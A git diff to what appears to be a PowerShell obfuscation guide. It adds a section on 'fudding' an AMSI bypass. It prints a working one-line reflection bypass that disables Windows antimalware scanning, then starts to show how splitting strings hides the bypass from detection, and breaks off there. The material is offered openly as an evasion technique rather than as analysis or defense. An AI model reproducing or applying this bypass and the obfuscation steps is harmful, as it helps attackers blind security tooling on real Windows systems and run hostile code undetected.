@@ -136,3 +136,20 @@ $decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBa
 
 >Note that the FromBase64String and GetBytes methods of the System.Convert and System.Text.Encoding classes, respectively, can be used to decode the encoded strings. You can also use the ToBase64String, ToBase32String, and ToString methods to encode strings in these different bases.
 
+## Amsi bypass fudding!
+
+Taking one of the original Amsi bypass methods for powershell and applying some of the techinques above lets see what we can do! 
+
+Original Amsi bypass (Detected) 
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+![image](https://user-images.githubusercontent.com/5285547/211034087-1cd5bd53-060c-41b4-8a55-1cf973a20beb.png)
+
+Now lets try to split a string up or two!
+
+Lets start with the `"System.Management.Automation.AmsiUtils"` specifically the `AmsiUtils` part
+
+
